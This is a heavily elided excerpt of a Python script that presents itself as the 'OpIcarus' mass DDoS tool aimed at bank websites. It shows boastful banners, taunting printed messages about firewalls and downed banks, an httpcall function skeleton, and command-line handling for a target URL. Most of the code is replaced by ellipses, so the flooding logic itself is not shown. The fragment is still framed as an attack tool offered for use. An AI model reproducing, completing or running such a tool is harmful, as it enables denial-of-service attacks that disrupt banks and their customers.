...
_________________________________________________________________
  ...
  #opicarus 2016    # I'm a bank destroyer, with my windows down
  #Yoshi city       # I'm a bank destroyer, I'm a bank destroyer
  #icarus bot       # I'm a bank destroyer, I'm a bank destroyer
  #Add Sites        # I'm a bank destroyer, I'm a bank destroyer
  ################### I'm a bank destroyer, I'm a bank destroyer
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			...
 			print '#~~~~~~> Fuck your Firewall <~~~~~~~#~~~~>your bank is down<~~~~#'
 			print '#~~~> Your bank will be down <~~~#~~~>By bot_Opicarus Mass DDoS<~~~#'
 			print '                                                                    '
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the OpIcarus in webserver bankster DDoS Tool"
		print "Created By OpIcarus"
		print "Moddified By global elite"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
